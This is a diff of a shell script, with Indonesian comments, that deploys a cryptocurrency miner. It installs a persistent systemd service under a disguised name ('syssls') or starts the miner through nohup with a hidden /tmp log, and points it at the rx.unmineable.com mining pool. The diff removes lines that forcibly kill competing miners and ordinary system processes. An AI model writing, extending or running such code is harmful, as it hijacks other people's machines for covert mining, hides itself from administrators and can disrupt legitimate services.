@@ -77,7 +77,6 @@ After=network.target
 Type=simple
 Restart=on-failure
 RestartSec=15s
-ExecStartPre=/bin/bash -c 'ps -ef | awk \"/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}\" | xargs kill -9'
 ExecStart=$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE -p x
 
 [Install]
@@ -92,7 +91,6 @@ WantedBy=multi-user.target" > /etc/systemd/system/syssls.service
     echo "Worker : VPS-$IP_TO_USE"
 else
     # Jika bukan root, bunuh proses miner sebelum menjalankan nohup
-    ps -ef | awk '/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|syssls|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/{print $2}' | xargs kill -9
     nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED -p x > /tmp/.logacil 2>&1 &
     echo "Menjalankan miner sebagai user non-root dengan nohup."
     echo "Worker : $HOSTNAME_REPLACED"
